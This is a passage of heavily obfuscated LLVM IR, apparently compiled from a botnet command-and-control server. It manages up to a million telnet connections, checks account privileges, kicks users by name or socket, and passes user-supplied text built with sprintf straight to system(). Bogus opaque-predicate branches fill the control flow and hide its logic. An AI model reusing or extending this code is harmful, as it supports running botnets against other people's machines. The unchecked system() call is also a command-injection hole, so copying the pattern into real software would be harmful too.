  %1302 = call i64 @send(i32 %1298, i8* %1299, i64 %1301, i32 16384)
  %1303 = icmp eq i64 %1302, -1
  br i1 %1303, label %1304, label %1321

; <label>:1304:                                   ; preds = %1289
  %1305 = load i32, i32* @x.23
  %1306 = load i32, i32* @y.24
  %1307 = sub i32 %1305, 1
  %1308 = mul i32 %1305, %1307
  %1309 = urem i32 %1308, 2
  %1310 = icmp eq i32 %1309, 0
  %1311 = icmp slt i32 %1306, 10
  %1312 = or i1 %1310, %1311
  br i1 %1312, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %1304
  store i8* null, i8** %2, align 8
  %1313 = load i32, i32* @x.23
  %1314 = load i32, i32* @y.24
  %1315 = sub i32 %1313, 1
  %1316 = mul i32 %1313, %1315
  %1317 = urem i32 %1316, 2
  %1318 = icmp eq i32 %1317, 0
  %1319 = icmp slt i32 %1314, 10
  %1320 = or i1 %1318, %1319
  br i1 %1320, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %1929

; <label>:1321:                                   ; preds = %1289
  %1322 = load i32, i32* @x.23
  %1323 = load i32, i32* @y.24
  %1324 = sub i32 %1322, 1
  %1325 = mul i32 %1322, %1324
  %1326 = urem i32 %1325, 2
  %1327 = icmp eq i32 %1326, 0
  %1328 = icmp slt i32 %1323, 10
  %1329 = or i1 %1327, %1328
  br i1 %1329, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1321
  %1330 = load i32, i32* @x.23
  %1331 = load i32, i32* @y.24
  %1332 = sub i32 %1330, 1
  %1333 = mul i32 %1330, %1332
  %1334 = urem i32 %1333, 2
  %1335 = icmp eq i32 %1334, 0
  %1336 = icmp slt i32 %1331, 10
  %1337 = or i1 %1335, %1336
  br i1 %1337, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br label %1338

; <label>:1338:                                   ; preds = %originalBBpart2182, %1282, %1274
  %1339 = load i32, i32* @x.23
  %1340 = load i32, i32* @y.24
  %1341 = sub i32 %1339, 1
  %1342 = mul i32 %1339, %1341
  %1343 = urem i32 %1342, 2
  %1344 = icmp eq i32 %1343, 0
  %1345 = icmp slt i32 %1340, 10
  %1346 = or i1 %1344, %1345
  br i1 %1346, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1338
  %1347 = load i32, i32* @x.23
  %1348 = load i32, i32* @y.24
  %1349 = sub i32 %1347, 1
  %1350 = mul i32 %1347, %1349
  %1351 = urem i32 %1350, 2
  %1352 = icmp eq i32 %1351, 0
  %1353 = icmp slt i32 %1348, 10
  %1354 = or i1 %1352, %1353
  br i1 %1354, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %1355

; <label>:1355:                                   ; preds = %originalBBpart2186
  %1356 = load i32, i32* @x.23
  %1357 = load i32, i32* @y.24
  %1358 = sub i32 %1356, 1
  %1359 = mul i32 %1356, %1358
  %1360 = urem i32 %1359, 2
  %1361 = icmp eq i32 %1360, 0
  %1362 = icmp slt i32 %1357, 10
  %1363 = or i1 %1361, %1362
  br i1 %1363, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1355
  %1364 = load i32, i32* %34, align 4
  %1365 = add nsw i32 %1364, 1
  store i32 %1365, i32* %34, align 4
  %1366 = load i32, i32* @x.23
  %1367 = load i32, i32* @y.24
  %1368 = sub i32 %1366, 1
  %1369 = mul i32 %1366, %1368
  %1370 = urem i32 %1369, 2
  %1371 = icmp eq i32 %1370, 0
  %1372 = icmp slt i32 %1367, 10
  %1373 = or i1 %1371, %1372
  br i1 %1373, label %originalBBpart2197, label %originalBB188alteredBB

originalBBpart2197:                               ; preds = %originalBB188
  br label %1271

; <label>:1374:                                   ; preds = %1271
  br label %1418

; <label>:1375:                                   ; preds = %1219
  %1376 = load i32, i32* @x.23
  %1377 = load i32, i32* @y.24
  %1378 = sub i32 %1376, 1
  %1379 = mul i32 %1376, %1378
  %1380 = urem i32 %1379, 2
  %1381 = icmp eq i32 %1380, 0
  %1382 = icmp slt i32 %1377, 10
  %1383 = or i1 %1381, %1382
  br i1 %1383, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %1375
  %1384 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1385 = call i32 (i8*, i8*, ...) @sprintf(i8* %1384, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %1386 = load i32, i32* %4, align 4
  %1387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1388 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1389 = call i64 @strlen(i8* %1388) #8
  %1390 = call i64 @send(i32 %1386, i8* %1387, i64 %1389, i32 16384)
  %1391 = icmp eq i64 %1390, -1
  %1392 = load i32, i32* @x.23
  %1393 = load i32, i32* @y.24
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBBpart2201, label %originalBB199alteredBB

originalBBpart2201:                               ; preds = %originalBB199
  br i1 %1391, label %1400, label %1401

; <label>:1400:                                   ; preds = %originalBBpart2201
  br label %1401

; <label>:1401:                                   ; preds = %1400, %originalBBpart2201
  %1402 = load i32, i32* @x.23
  %1403 = load i32, i32* @y.24
  %1404 = sub i32 %1402, 1
  %1405 = mul i32 %1402, %1404
  %1406 = urem i32 %1405, 2
  %1407 = icmp eq i32 %1406, 0
  %1408 = icmp slt i32 %1403, 10
  %1409 = or i1 %1407, %1408
  br i1 %1409, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %1401
  %1410 = load i32, i32* @x.23
  %1411 = load i32, i32* @y.24
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  br label %1418

; <label>:1418:                                   ; preds = %originalBBpart2205, %1374
  br label %1419

; <label>:1419:                                   ; preds = %1418, %originalBBpart2162
  %1420 = load i32, i32* @x.23
  %1421 = load i32, i32* @y.24
  %1422 = sub i32 %1420, 1
  %1423 = mul i32 %1420, %1422
  %1424 = urem i32 %1423, 2
  %1425 = icmp eq i32 %1424, 0
  %1426 = icmp slt i32 %1421, 10
  %1427 = or i1 %1425, %1426
  br i1 %1427, label %originalBB207, label %originalBB207alteredBB

originalBB207:                                    ; preds = %originalBB207alteredBB, %1419
  %1428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1429 = call i8* @strstr(i8* %1428, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #8
  %1430 = icmp ne i8* %1429, null
  %1431 = load i32, i32* @x.23
  %1432 = load i32, i32* @y.24
  %1433 = sub i32 %1431, 1
  %1434 = mul i32 %1431, %1433
  %1435 = urem i32 %1434, 2
  %1436 = icmp eq i32 %1435, 0
  %1437 = icmp slt i32 %1432, 10
  %1438 = or i1 %1436, %1437
  br i1 %1438, label %originalBBpart2209, label %originalBB207alteredBB

originalBBpart2209:                               ; preds = %originalBB207
  br i1 %1430, label %1439, label %1717

; <label>:1439:                                   ; preds = %originalBBpart2209
  %1440 = load i8*, i8** %13, align 8
  %1441 = load i32, i32* %5, align 4
  %1442 = sext i32 %1441 to i64
  %1443 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1442
  %1444 = getelementptr inbounds %struct.account, %struct.account* %1443, i32 0, i32 2
  %1445 = getelementptr inbounds [200 x i8], [200 x i8]* %1444, i32 0, i32 0
  %1446 = call i32 @strcmp(i8* %1440, i8* %1445) #8
  %1447 = icmp eq i32 %1446, 0
  br i1 %1447, label %1473, label %1448

; <label>:1448:                                   ; preds = %1439
  %1449 = load i32, i32* @x.23
  %1450 = load i32, i32* @y.24
  %1451 = sub i32 %1449, 1
  %1452 = mul i32 %1449, %1451
  %1453 = urem i32 %1452, 2
  %1454 = icmp eq i32 %1453, 0
  %1455 = icmp slt i32 %1450, 10
  %1456 = or i1 %1454, %1455
  br i1 %1456, label %originalBB211, label %originalBB211alteredBB

originalBB211:                                    ; preds = %originalBB211alteredBB, %1448
  %1457 = load i8*, i8** %13, align 8
  %1458 = load i32, i32* %5, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1459
  %1461 = getelementptr inbounds %struct.account, %struct.account* %1460, i32 0, i32 2
  %1462 = getelementptr inbounds [200 x i8], [200 x i8]* %1461, i32 0, i32 0
  %1463 = call i32 @strcmp(i8* %1457, i8* %1462) #8
  %1464 = icmp eq i32 %1463, 0
  %1465 = load i32, i32* @x.23
  %1466 = load i32, i32* @y.24
  %1467 = sub i32 %1465, 1
  %1468 = mul i32 %1465, %1467
  %1469 = urem i32 %1468, 2
  %1470 = icmp eq i32 %1469, 0
  %1471 = icmp slt i32 %1466, 10
  %1472 = or i1 %1470, %1471
  br i1 %1472, label %originalBBpart2213, label %originalBB211alteredBB

originalBBpart2213:                               ; preds = %originalBB211
  br i1 %1464, label %1473, label %1689

; <label>:1473:                                   ; preds = %originalBBpart2213, %1439
  %1474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1475 = call i8* @strstr(i8* %1474, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0)) #8
  %1476 = icmp ne i8* %1475, null
  br i1 %1476, label %1481, label %1477

; <label>:1477:                                   ; preds = %1473
  %1478 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1479 = call i8* @strstr(i8* %1478, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)) #8
  %1480 = icmp ne i8* %1479, null
  br i1 %1480, label %1481, label %1590

; <label>:1481:                                   ; preds = %1477, %1473
  %1482 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1483 = call i8* @strtok(i8* %1482, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %1483, i8** %37, align 8
  %1484 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %1485 = load i8*, i8** %37, align 8
  %1486 = load i8*, i8** %37, align 8
  %1487 = call i64 @strlen(i8* %1486) #8
  %1488 = getelementptr inbounds i8, i8* %1485, i64 %1487
  %1489 = getelementptr inbounds i8, i8* %1488, i64 1
  %1490 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %1484, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %1489) #7
  %1491 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %1491)
  store i32 0, i32* %35, align 4
  br label %1492

; <label>:1492:                                   ; preds = %1586, %1481
  %1493 = load i32, i32* %35, align 4
  %1494 = icmp slt i32 %1493, 1000000
  br i1 %1494, label %1495, label %1589

; <label>:1495:                                   ; preds = %1492
  %1496 = load i32, i32* @x.23
  %1497 = load i32, i32* @y.24
  %1498 = sub i32 %1496, 1
  %1499 = mul i32 %1496, %1498
  %1500 = urem i32 %1499, 2
  %1501 = icmp eq i32 %1500, 0
  %1502 = icmp slt i32 %1497, 10
  %1503 = or i1 %1501, %1502
  br i1 %1503, label %originalBB215, label %originalBB215alteredBB

originalBB215:                                    ; preds = %originalBB215alteredBB, %1495
  %1504 = load i32, i32* %35, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1505
  %1507 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1506, i32 0, i32 2
  %1508 = getelementptr inbounds [20 x i8], [20 x i8]* %1507, i32 0, i32 0
  %1509 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %1510 = call i8* @strstr(i8* %1508, i8* %1509) #8
  %1511 = icmp ne i8* %1510, null
  %1512 = load i32, i32* @x.23
  %1513 = load i32, i32* @y.24
  %1514 = sub i32 %1512, 1
  %1515 = mul i32 %1512, %1514
  %1516 = urem i32 %1515, 2
  %1517 = icmp eq i32 %1516, 0
  %1518 = icmp slt i32 %1513, 10
  %1519 = or i1 %1517, %1518
  br i1 %1519, label %originalBBpart2217, label %originalBB215alteredBB

originalBBpart2217:                               ; preds = %originalBB215
  br i1 %1511, label %1520, label %1585

; <label>:1520:                                   ; preds = %originalBBpart2217
  %1521 = load i32, i32* @x.23
  %1522 = load i32, i32* @y.24
  %1523 = sub i32 %1521, 1
  %1524 = mul i32 %1521, %1523
  %1525 = urem i32 %1524, 2
  %1526 = icmp eq i32 %1525, 0
  %1527 = icmp slt i32 %1522, 10
  %1528 = or i1 %1526, %1527
  br i1 %1528, label %originalBB219, label %originalBB219alteredBB

originalBB219:                                    ; preds = %originalBB219alteredBB, %1520
  %1529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1530 = load i32, i32* %4, align 4
  %1531 = sext i32 %1530 to i64
  %1532 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1531
  %1533 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1532, i32 0, i32 2
  %1534 = getelementptr inbounds [20 x i8], [20 x i8]* %1533, i32 0, i32 0
  %1535 = call i32 (i8*, i8*, ...) @sprintf(i8* %1529, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %1534) #7
  %1536 = load i32, i32* %35, align 4
  %1537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1539 = call i64 @strlen(i8* %1538) #8
  %1540 = call i64 @send(i32 %1536, i8* %1537, i64 %1539, i32 16384)
  %1541 = icmp eq i64 %1540, -1
  %1542 = load i32, i32* @x.23
  %1543 = load i32, i32* @y.24
  %1544 = sub i32 %1542, 1
  %1545 = mul i32 %1542, %1544
  %1546 = urem i32 %1545, 2
  %1547 = icmp eq i32 %1546, 0
  %1548 = icmp slt i32 %1543, 10
  %1549 = or i1 %1547, %1548
  br i1 %1549, label %originalBBpart2221, label %originalBB219alteredBB

originalBBpart2221:                               ; preds = %originalBB219
  br i1 %1541, label %1550, label %1567

; <label>:1550:                                   ; preds = %originalBBpart2221
  %1551 = load i32, i32* @x.23
  %1552 = load i32, i32* @y.24
  %1553 = sub i32 %1551, 1
  %1554 = mul i32 %1551, %1553
  %1555 = urem i32 %1554, 2
  %1556 = icmp eq i32 %1555, 0
  %1557 = icmp slt i32 %1552, 10
  %1558 = or i1 %1556, %1557
  br i1 %1558, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %1550
  store i8* null, i8** %2, align 8
  %1559 = load i32, i32* @x.23
  %1560 = load i32, i32* @y.24
  %1561 = sub i32 %1559, 1
  %1562 = mul i32 %1559, %1561
  %1563 = urem i32 %1562, 2
  %1564 = icmp eq i32 %1563, 0
  %1565 = icmp slt i32 %1560, 10
  %1566 = or i1 %1564, %1565
  br i1 %1566, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br label %1929

; <label>:1567:                                   ; preds = %originalBBpart2221
  %1568 = load i32, i32* %35, align 4
  %1569 = sext i32 %1568 to i64
  %1570 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1569
  %1571 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1570, i32 0, i32 1
  store i32 0, i32* %1571, align 4
  %1572 = load i32, i32* %35, align 4
  %1573 = call i32 @close(i32 %1572)
  %1574 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1575 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %1576 = call i32 (i8*, i8*, ...) @sprintf(i8* %1574, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i32 0, i32 0), i8* %1575) #7
  %1577 = load i32, i32* %4, align 4
  %1578 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1579 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1580 = call i64 @strlen(i8* %1579) #8
  %1581 = call i64 @send(i32 %1577, i8* %1578, i64 %1580, i32 16384)
  %1582 = icmp eq i64 %1581, -1
  br i1 %1582, label %1583, label %1584

; <label>:1583:                                   ; preds = %1567
  store i8* null, i8** %2, align 8
  br label %1929

; <label>:1584:                                   ; preds = %1567
  br label %1585

; <label>:1585:                                   ; preds = %1584, %originalBBpart2217
  br label %1586

; <label>:1586:                                   ; preds = %1585
  %1587 = load i32, i32* %35, align 4
  %1588 = add nsw i32 %1587, 1
  store i32 %1588, i32* %35, align 4
  br label %1492

; <label>:1589:                                   ; preds = %1492
  br label %1672

; <label>:1590:                                   ; preds = %1477
  %1591 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1592 = call i8* @strstr(i8* %1591, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #8
  %1593 = icmp ne i8* %1592, null
  br i1 %1593, label %1598, label %1594

; <label>:1594:                                   ; preds = %1590
  %1595 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1596 = call i8* @strstr(i8* %1595, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #8
  %1597 = icmp ne i8* %1596, null
  br i1 %1597, label %1598, label %1671

; <label>:1598:                                   ; preds = %1594, %1590
  %1599 = load i32, i32* @x.23
  %1600 = load i32, i32* @y.24
  %1601 = sub i32 %1599, 1
  %1602 = mul i32 %1599, %1601
  %1603 = urem i32 %1602, 2
  %1604 = icmp eq i32 %1603, 0
  %1605 = icmp slt i32 %1600, 10
  %1606 = or i1 %1604, %1605
  br i1 %1606, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %1598
  %1607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1608 = call i8* @strtok(i8* %1607, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %1608, i8** %38, align 8
  %1609 = load i8*, i8** %38, align 8
  %1610 = load i8*, i8** %38, align 8
  %1611 = call i64 @strlen(i8* %1610) #8
  %1612 = getelementptr inbounds i8, i8* %1609, i64 %1611
  %1613 = getelementptr inbounds i8, i8* %1612, i64 1
  %1614 = call i32 @atoi(i8* %1613) #8
  store i32 %1614, i32* %39, align 4
  %1615 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1616 = load i32, i32* %4, align 4
  %1617 = sext i32 %1616 to i64
  %1618 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1617
  %1619 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1618, i32 0, i32 2
  %1620 = getelementptr inbounds [20 x i8], [20 x i8]* %1619, i32 0, i32 0
  %1621 = call i32 (i8*, i8*, ...) @sprintf(i8* %1615, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %1620) #7
  %1622 = load i32, i32* %39, align 4
  %1623 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1625 = call i64 @strlen(i8* %1624) #8
  %1626 = call i64 @send(i32 %1622, i8* %1623, i64 %1625, i32 16384)
  %1627 = icmp eq i64 %1626, -1
  %1628 = load i32, i32* @x.23
  %1629 = load i32, i32* @y.24
  %1630 = sub i32 %1628, 1
  %1631 = mul i32 %1628, %1630
  %1632 = urem i32 %1631, 2
  %1633 = icmp eq i32 %1632, 0
  %1634 = icmp slt i32 %1629, 10
  %1635 = or i1 %1633, %1634
  br i1 %1635, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br i1 %1627, label %1636, label %1653

; <label>:1636:                                   ; preds = %originalBBpart2229
  %1637 = load i32, i32* @x.23
  %1638 = load i32, i32* @y.24
  %1639 = sub i32 %1637, 1
  %1640 = mul i32 %1637, %1639
  %1641 = urem i32 %1640, 2
  %1642 = icmp eq i32 %1641, 0
  %1643 = icmp slt i32 %1638, 10
  %1644 = or i1 %1642, %1643
  br i1 %1644, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %1636
  store i8* null, i8** %2, align 8
  %1645 = load i32, i32* @x.23
  %1646 = load i32, i32* @y.24
  %1647 = sub i32 %1645, 1
  %1648 = mul i32 %1645, %1647
  %1649 = urem i32 %1648, 2
  %1650 = icmp eq i32 %1649, 0
  %1651 = icmp slt i32 %1646, 10
  %1652 = or i1 %1650, %1651
  br i1 %1652, label %originalBBpart2233, label %originalBB231alteredBB

originalBBpart2233:                               ; preds = %originalBB231
  br label %1929

; <label>:1653:                                   ; preds = %originalBBpart2229
  %1654 = load i32, i32* %39, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1655
  %1657 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1656, i32 0, i32 1
  store i32 0, i32* %1657, align 4
  %1658 = load i32, i32* %39, align 4
  %1659 = call i32 @close(i32 %1658)
  %1660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1661 = load i32, i32* %39, align 4
  %1662 = call i32 (i8*, i8*, ...) @sprintf(i8* %1660, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i32 0, i32 0), i32 %1661) #7
  %1663 = load i32, i32* %4, align 4
  %1664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1665 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1666 = call i64 @strlen(i8* %1665) #8
  %1667 = call i64 @send(i32 %1663, i8* %1664, i64 %1666, i32 16384)
  %1668 = icmp eq i64 %1667, -1
  br i1 %1668, label %1669, label %1670

; <label>:1669:                                   ; preds = %1653
  store i8* null, i8** %2, align 8
  br label %1929

; <label>:1670:                                   ; preds = %1653
  br label %1671

; <label>:1671:                                   ; preds = %1670, %1594
  br label %1672

; <label>:1672:                                   ; preds = %1671, %1589
  %1673 = load i32, i32* @x.23
  %1674 = load i32, i32* @y.24
  %1675 = sub i32 %1673, 1
  %1676 = mul i32 %1673, %1675
  %1677 = urem i32 %1676, 2
  %1678 = icmp eq i32 %1677, 0
  %1679 = icmp slt i32 %1674, 10
  %1680 = or i1 %1678, %1679
  br i1 %1680, label %originalBB235, label %originalBB235alteredBB

originalBB235:                                    ; preds = %originalBB235alteredBB, %1672
  %1681 = load i32, i32* @x.23
  %1682 = load i32, i32* @y.24
  %1683 = sub i32 %1681, 1
  %1684 = mul i32 %1681, %1683
  %1685 = urem i32 %1684, 2
  %1686 = icmp eq i32 %1685, 0
  %1687 = icmp slt i32 %1682, 10
  %1688 = or i1 %1686, %1687
  br i1 %1688, label %originalBBpart2237, label %originalBB235alteredBB

originalBBpart2237:                               ; preds = %originalBB235
  br label %1716

; <label>:1689:                                   ; preds = %originalBBpart2213
  %1690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1691 = call i32 (i8*, i8*, ...) @sprintf(i8* %1690, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i32 0, i32 0)) #7
  %1692 = load i32, i32* %4, align 4
  %1693 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1694 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1695 = call i64 @strlen(i8* %1694) #8
  %1696 = call i64 @send(i32 %1692, i8* %1693, i64 %1695, i32 16384)
  %1697 = icmp eq i64 %1696, -1
  br i1 %1697, label %1698, label %1699

; <label>:1698:                                   ; preds = %1689
  br label %1699

; <label>:1699:                                   ; preds = %1698, %1689
  %1700 = load i32, i32* @x.23
  %1701 = load i32, i32* @y.24
  %1702 = sub i32 %1700, 1
  %1703 = mul i32 %1700, %1702
  %1704 = urem i32 %1703, 2
  %1705 = icmp eq i32 %1704, 0
  %1706 = icmp slt i32 %1701, 10
  %1707 = or i1 %1705, %1706
  br i1 %1707, label %originalBB239, label %originalBB239alteredBB

originalBB239:                                    ; preds = %originalBB239alteredBB, %1699
  %1708 = load i32, i32* @x.23
  %1709 = load i32, i32* @y.24
  %1710 = sub i32 %1708, 1
  %1711 = mul i32 %1708, %1710
  %1712 = urem i32 %1711, 2
  %1713 = icmp eq i32 %1712, 0
  %1714 = icmp slt i32 %1709, 10
  %1715 = or i1 %1713, %1714
  br i1 %1715, label %originalBBpart2241, label %originalBB239alteredBB

originalBBpart2241:                               ; preds = %originalBB239
  br label %1716

; <label>:1716:                                   ; preds = %originalBBpart2241, %originalBBpart2237
  br label %1717

; <label>:1717:                                   ; preds = %1716, %originalBBpart2209
  %1718 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1719 = call i8* @strstr(i8* %1718, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0)) #8
  %1720 = icmp ne i8* %1719, null
  br i1 %1720, label %1721, label %1854

; <label>:1721:                                   ; preds = %1717
  %1722 = load i8*, i8** %12, align 8
  %1723 = load i32, i32* %5, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1724
  %1726 = getelementptr inbounds %struct.account, %struct.account* %1725, i32 0, i32 2
  %1727 = getelementptr inbounds [200 x i8], [200 x i8]* %1726, i32 0, i32 0
  %1728 = call i32 @strcmp(i8* %1722, i8* %1727) #8
  %1729 = icmp eq i32 %1728, 0
  br i1 %1729, label %1739, label %1730

; <label>:1730:                                   ; preds = %1721
  %1731 = load i8*, i8** %13, align 8
  %1732 = load i32, i32* %5, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1733
  %1735 = getelementptr inbounds %struct.account, %struct.account* %1734, i32 0, i32 2
  %1736 = getelementptr inbounds [200 x i8], [200 x i8]* %1735, i32 0, i32 0
  %1737 = call i32 @strcmp(i8* %1731, i8* %1736) #8
  %1738 = icmp eq i32 %1737, 0
  br i1 %1738, label %1739, label %1810

; <label>:1739:                                   ; preds = %1730, %1721
  %1740 = load i32, i32* @x.23
  %1741 = load i32, i32* @y.24
  %1742 = sub i32 %1740, 1
  %1743 = mul i32 %1740, %1742
  %1744 = urem i32 %1743, 2
  %1745 = icmp eq i32 %1744, 0
  %1746 = icmp slt i32 %1741, 10
  %1747 = or i1 %1745, %1746
  br i1 %1747, label %originalBB243, label %originalBB243alteredBB

originalBB243:                                    ; preds = %originalBB243alteredBB, %1739
  %1748 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1749 = call i8* @strtok(i8* %1748, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %1749, i8** %40, align 8
  %1750 = load i8*, i8** %40, align 8
  %1751 = getelementptr inbounds i8, i8* %1750, i64 8
  store i8* %1751, i8** %41, align 8
  %1752 = load i8*, i8** %41, align 8
  call void @trim(i8* %1752)
  %1753 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %1754 = bitcast i8** %1753 to i8*
  %1755 = load i8*, i8** %41, align 8
  %1756 = call i32 (i8*, i8*, ...) @sprintf(i8* %1754, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i32 0, i32 0), i8* %1755) #7
  %1757 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %1758 = bitcast i8** %1757 to i8*
  %1759 = call i32 @system(i8* %1758)
  %1760 = load i32, i32* %5, align 4
  %1761 = sext i32 %1760 to i64
  %1762 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1761
  %1763 = getelementptr inbounds %struct.account, %struct.account* %1762, i32 0, i32 0
  %1764 = getelementptr inbounds [200 x i8], [200 x i8]* %1763, i32 0, i32 0
  %1765 = load i8*, i8** %41, align 8
  %1766 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %1764, i8* %1765)
  %1767 = load i32, i32* %4, align 4
  %1768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
